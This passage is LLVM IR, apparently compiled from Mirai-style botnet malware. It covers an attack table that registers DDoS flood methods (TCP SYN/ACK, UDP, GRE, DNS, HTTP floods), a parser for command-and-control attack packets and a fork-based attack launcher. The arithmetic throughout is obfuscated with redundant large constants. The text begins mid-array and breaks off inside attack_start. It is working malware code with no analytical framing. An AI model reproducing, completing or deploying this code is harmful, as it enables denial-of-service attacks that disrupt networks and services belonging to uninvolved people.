x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.255, i32 0, i32 0)], align 16

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcp)
  call void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpplain)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_stdhex)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greip)
  call void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greeth)
  call void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udprandom)
  call void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpack)
  call void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpsyn)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpstorm)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_dns)
  call void @add_attack(i8 zeroext 11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_app_http)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = sub i32 0, 1
  %19 = sub i32 %17, %18
  %20 = add nsw i32 %17, 1
  %21 = sext i32 %19 to i64
  %22 = mul i64 %21, 8
  %23 = call i8* @realloc(i8* %15, i64 %22) #6
  %24 = bitcast i8* %23 to %struct.attack_method**
  store %struct.attack_method** %24, %struct.attack_method*** @methods, align 8
  %25 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %26 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %27 = load i8, i8* @methods_len, align 1
  %28 = sub i8 0, %27
  %29 = sub i8 0, 1
  %30 = add i8 %28, %29
  %31 = sub i8 0, %30
  %32 = add i8 %27, 1
  store i8 %31, i8* @methods_len, align 1
  %33 = zext i8 %27 to i64
  %34 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %26, i64 %33
  store %struct.attack_method* %25, %struct.attack_method** %34, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  br label %2

; <label>:2:                                      ; preds = %21, %0
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 15
  br i1 %4, label %5, label %27

; <label>:5:                                      ; preds = %2
  %6 = load i32, i32* %1, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %7
  %9 = load i32, i32* %8, align 4
  %10 = icmp ne i32 %9, 0
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %5
  %12 = load i32, i32* %1, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %13
  %15 = load i32, i32* %14, align 4
  %16 = call i32 @kill(i32 %15, i32 9) #6
  br label %17

; <label>:17:                                     ; preds = %11, %5
  %18 = load i32, i32* %1, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %19
  store i32 0, i32* %20, align 4
  br label %21

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %1, align 4
  %23 = sub i32 %22, -1703051044
  %24 = add i32 %23, 1
  %25 = add i32 %24, -1703051044
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %1, align 4
  br label %2

; <label>:27:                                     ; preds = %2
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %2
  br label %252

; <label>:17:                                     ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 %20) #7
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = sub i64 0, 4
  %27 = add i64 %25, %26
  %28 = sub i64 %25, 4
  %29 = trunc i64 %27 to i32
  store i32 %29, i32* %4, align 4
  %30 = load i32, i32* %4, align 4
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %32, label %33

; <label>:32:                                     ; preds = %17
  br label %252

; <label>:33:                                     ; preds = %17
  %34 = load i8*, i8** %3, align 8
  %35 = getelementptr inbounds i8, i8* %34, i32 1
  store i8* %35, i8** %3, align 8
  %36 = load i8, i8* %34, align 1
  store i8 %36, i8* %7, align 1
  %37 = load i32, i32* %4, align 4
  %38 = sext i32 %37 to i64
  %39 = add i64 %38, -2747804548456225677
  %40 = sub i64 %39, 1
  %41 = sub i64 %40, -2747804548456225677
  %42 = sub i64 %38, 1
  %43 = trunc i64 %41 to i32
  store i32 %43, i32* %4, align 4
  %44 = load i32, i32* %4, align 4
  %45 = icmp eq i32 %44, 0
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %33
  br label %252

; <label>:47:                                     ; preds = %33
  %48 = load i8*, i8** %3, align 8
  %49 = getelementptr inbounds i8, i8* %48, i32 1
  store i8* %49, i8** %3, align 8
  %50 = load i8, i8* %48, align 1
  store i8 %50, i8* %8, align 1
  %51 = load i32, i32* %4, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 %52, -3396420168686678071
  %54 = sub i64 %53, 1
  %55 = add i64 %54, -3396420168686678071
  %56 = sub i64 %52, 1
  %57 = trunc i64 %55 to i32
  store i32 %57, i32* %4, align 4
  %58 = load i8, i8* %8, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %47
  br label %252

; <label>:62:                                     ; preds = %47
  %63 = load i32, i32* %4, align 4
  %64 = sext i32 %63 to i64
  %65 = load i8, i8* %8, align 1
  %66 = zext i8 %65 to i64
  %67 = mul i64 5, %66
  %68 = icmp ult i64 %64, %67
  br i1 %68, label %69, label %70

; <label>:69:                                     ; preds = %62
  br label %252

; <label>:70:                                     ; preds = %62
  %71 = load i8, i8* %8, align 1
  %72 = zext i8 %71 to i64
  %73 = call noalias i8* @calloc(i64 %72, i64 24) #6
  %74 = bitcast i8* %73 to %struct.attack_target*
  store %struct.attack_target* %74, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %75

; <label>:75:                                     ; preds = %125, %70
  %76 = load i32, i32* %5, align 4
  %77 = load i8, i8* %8, align 1
  %78 = zext i8 %77 to i32
  %79 = icmp slt i32 %76, %78
  br i1 %79, label %80, label %131

; <label>:80:                                     ; preds = %75
  %81 = load i8*, i8** %3, align 8
  %82 = bitcast i8* %81 to i32*
  %83 = load i32, i32* %82, align 4
  %84 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %85 = load i32, i32* %5, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 1
  store i32 %83, i32* %88, align 4
  %89 = load i8*, i8** %3, align 8
  %90 = getelementptr inbounds i8, i8* %89, i64 4
  store i8* %90, i8** %3, align 8
  %91 = load i8*, i8** %3, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 1
  store i8* %92, i8** %3, align 8
  %93 = load i8, i8* %91, align 1
  %94 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %95 = load i32, i32* %5, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %94, i64 %96
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %97, i32 0, i32 2
  store i8 %93, i8* %98, align 4
  %99 = load i32, i32* %4, align 4
  %100 = sext i32 %99 to i64
  %101 = add i64 %100, 6844786415245247179
  %102 = sub i64 %101, 5
  %103 = sub i64 %102, 6844786415245247179
  %104 = sub i64 %100, 5
  %105 = trunc i64 %103 to i32
  store i32 %105, i32* %4, align 4
  %106 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %107 = load i32, i32* %5, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %106, i64 %108
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %109, i32 0, i32 0
  %111 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %110, i32 0, i32 0
  store i16 2, i16* %111, align 4
  %112 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %113 = load i32, i32* %5, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %112, i64 %114
  %116 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %115, i32 0, i32 1
  %117 = load i32, i32* %116, align 4
  %118 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %119 = load i32, i32* %5, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %118, i64 %120
  %122 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %121, i32 0, i32 0
  %123 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %122, i32 0, i32 2
  %124 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %123, i32 0, i32 0
  store i32 %117, i32* %124, align 4
  br label %125

; <label>:125:                                    ; preds = %80
  %126 = load i32, i32* %5, align 4
  %127 = add i32 %126, -1343847627
  %128 = add i32 %127, 1
  %129 = sub i32 %128, -1343847627
  %130 = add nsw i32 %126, 1
  store i32 %129, i32* %5, align 4
  br label %75

; <label>:131:                                    ; preds = %75
  %132 = load i32, i32* %4, align 4
  %133 = sext i32 %132 to i64
  %134 = icmp ult i64 %133, 1
  br i1 %134, label %135, label %136

; <label>:135:                                    ; preds = %131
  br label %252

; <label>:136:                                    ; preds = %131
  %137 = load i8*, i8** %3, align 8
  %138 = getelementptr inbounds i8, i8* %137, i32 1
  store i8* %138, i8** %3, align 8
  %139 = load i8, i8* %137, align 1
  store i8 %139, i8* %9, align 1
  %140 = load i32, i32* %4, align 4
  %141 = sext i32 %140 to i64
  %142 = add i64 %141, 3945921310250520145
  %143 = sub i64 %142, 1
  %144 = sub i64 %143, 3945921310250520145
  %145 = sub i64 %141, 1
  %146 = trunc i64 %144 to i32
  store i32 %146, i32* %4, align 4
  %147 = load i8, i8* %9, align 1
  %148 = zext i8 %147 to i32
  %149 = icmp sgt i32 %148, 0
  br i1 %149, label %150, label %244

; <label>:150:                                    ; preds = %136
  %151 = load i8, i8* %9, align 1
  %152 = zext i8 %151 to i64
  %153 = call noalias i8* @calloc(i64 %152, i64 16) #6
  %154 = bitcast i8* %153 to %struct.attack_option*
  store %struct.attack_option* %154, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %155

; <label>:155:                                    ; preds = %237, %150
  %156 = load i32, i32* %5, align 4
  %157 = load i8, i8* %9, align 1
  %158 = zext i8 %157 to i32
  %159 = icmp slt i32 %156, %158
  br i1 %159, label %160, label %243

; <label>:160:                                    ; preds = %155
  %161 = load i32, i32* %4, align 4
  %162 = sext i32 %161 to i64
  %163 = icmp ult i64 %162, 1
  br i1 %163, label %164, label %165

; <label>:164:                                    ; preds = %160
  br label %252

; <label>:165:                                    ; preds = %160
  %166 = load i8*, i8** %3, align 8
  %167 = getelementptr inbounds i8, i8* %166, i32 1
  store i8* %167, i8** %3, align 8
  %168 = load i8, i8* %166, align 1
  %169 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %170 = load i32, i32* %5, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %169, i64 %171
  %173 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %172, i32 0, i32 1
  store i8 %168, i8* %173, align 8
  %174 = load i32, i32* %4, align 4
  %175 = sext i32 %174 to i64
  %176 = sub i64 %175, 9023089840587629526
  %177 = sub i64 %176, 1
  %178 = add i64 %177, 9023089840587629526
  %179 = sub i64 %175, 1
  %180 = trunc i64 %178 to i32
  store i32 %180, i32* %4, align 4
  %181 = load i32, i32* %4, align 4
  %182 = sext i32 %181 to i64
  %183 = icmp ult i64 %182, 1
  br i1 %183, label %184, label %185

; <label>:184:                                    ; preds = %165
  br label %252

; <label>:185:                                    ; preds = %165
  %186 = load i8*, i8** %3, align 8
  %187 = getelementptr inbounds i8, i8* %186, i32 1
  store i8* %187, i8** %3, align 8
  %188 = load i8, i8* %186, align 1
  store i8 %188, i8* %12, align 1
  %189 = load i32, i32* %4, align 4
  %190 = sext i32 %189 to i64
  %191 = add i64 %190, -260930185412596687
  %192 = sub i64 %191, 1
  %193 = sub i64 %192, -260930185412596687
  %194 = sub i64 %190, 1
  %195 = trunc i64 %193 to i32
  store i32 %195, i32* %4, align 4
  %196 = load i32, i32* %4, align 4
  %197 = load i8, i8* %12, align 1
  %198 = zext i8 %197 to i32
  %199 = icmp slt i32 %196, %198
  br i1 %199, label %200, label %201

; <label>:200:                                    ; preds = %185
  br label %252

; <label>:201:                                    ; preds = %185
  %202 = load i8, i8* %12, align 1
  %203 = zext i8 %202 to i32
  %204 = sub i32 0, %203
  %205 = sub i32 0, 1
  %206 = add i32 %204, %205
  %207 = sub i32 0, %206
  %208 = add nsw i32 %203, 1
  %209 = sext i32 %207 to i64
  %210 = call noalias i8* @calloc(i64 %209, i64 1) #6
  %211 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %212 = load i32, i32* %5, align 4
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %211, i64 %213
  %215 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %214, i32 0, i32 0
  store i8* %210, i8** %215, align 8
  %216 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %217 = load i32, i32* %5, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %216, i64 %218
  %220 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %219, i32 0, i32 0
  %221 = load i8*, i8** %220, align 8
  %222 = load i8*, i8** %3, align 8
  %223 = load i8, i8* %12, align 1
  %224 = zext i8 %223 to i32
  call void @util_memcpy(i8* %221, i8* %222, i32 %224)
  %225 = load i8, i8* %12, align 1
  %226 = zext i8 %225 to i32
  %227 = load i8*, i8** %3, align 8
  %228 = sext i32 %226 to i64
  %229 = getelementptr inbounds i8, i8* %227, i64 %228
  store i8* %229, i8** %3, align 8
  %230 = load i8, i8* %12, align 1
  %231 = zext i8 %230 to i32
  %232 = load i32, i32* %4, align 4
  %233 = add i32 %232, -717467071
  %234 = sub i32 %233, %231
  %235 = sub i32 %234, -717467071
  %236 = sub nsw i32 %232, %231
  store i32 %235, i32* %4, align 4
  br label %237

; <label>:237:                                    ; preds = %201
  %238 = load i32, i32* %5, align 4
  %239 = add i32 %238, -232847022
  %240 = add i32 %239, 1
  %241 = sub i32 %240, -232847022
  %242 = add nsw i32 %238, 1
  store i32 %241, i32* %5, align 4
  br label %155

; <label>:243:                                    ; preds = %155
  br label %244

; <label>:244:                                    ; preds = %243, %136
  %245 = call i32* @__errno_location() #7
  store i32 0, i32* %245, align 4
  %246 = load i32, i32* %6, align 4
  %247 = load i8, i8* %7, align 1
  %248 = load i8, i8* %8, align 1
  %249 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %250 = load i8, i8* %9, align 1
  %251 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %246, i8 zeroext %247, i8 zeroext %248, %struct.attack_target* %249, i8 zeroext %250, %struct.attack_option* %251)
  br label %252

; <label>:252:                                    ; preds = %244, %200, %184, %164, %135, %69, %61, %46, %32, %16
  %253 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %254 = icmp ne %struct.attack_target* %253, null
  br i1 %254, label %255, label %258

; <label>:255:                                    ; preds = %252
  %256 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %257 = bitcast %struct.attack_target* %256 to i8*
  call void @free(i8* %257) #6
  br label %258

; <label>:258:                                    ; preds = %255, %252
  %259 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %260 = icmp ne %struct.attack_option* %259, null
  br i1 %260, label %261, label %265

; <label>:261:                                    ; preds = %258
  %262 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %263 = load i8, i8* %9, align 1
  %264 = zext i8 %263 to i32
  call void @free_opts(%struct.attack_option* %262, i32 %264)
  br label %265

; <label>:265:                                    ; preds = %261, %258
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %16 = call i32 @fork() #6
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %13, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %22, label %19

; <label>:19:                                     ; preds = %6
  %20 = load i32, i32* %13, align 4
  %21 = icmp sgt i32 %20, 0
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %19, %6
  ret void

; <label>:23:                                     ; preds = %19
  %24 = call i32 @fork() #6
  store i32 %24, i32* %14, align 4
  %25 = load i32, i32* %14, align 4
  %26 = icmp eq i32 %25, -1
  br i1 %26, label %27, label %28

; <label>:27:                                     ; preds = %23
  call void @exit(i32 0) #8
  unreachable

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* %14, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %36

; <label>:31:                                     ; preds = %28
  %32 = load i32, i32* %7, align 4
  %33 = call i32 @sleep(i32 %32)
  %34 = call i32 @getppid() #6
  %35 = call i32 @kill(i32 %34, i32 9) #6
  call void @exit(i32 0) #8
  unreachable

; <label>:36:                                     ; preds = %28
  store i32 0, i32* %15, align 4
  br label %37

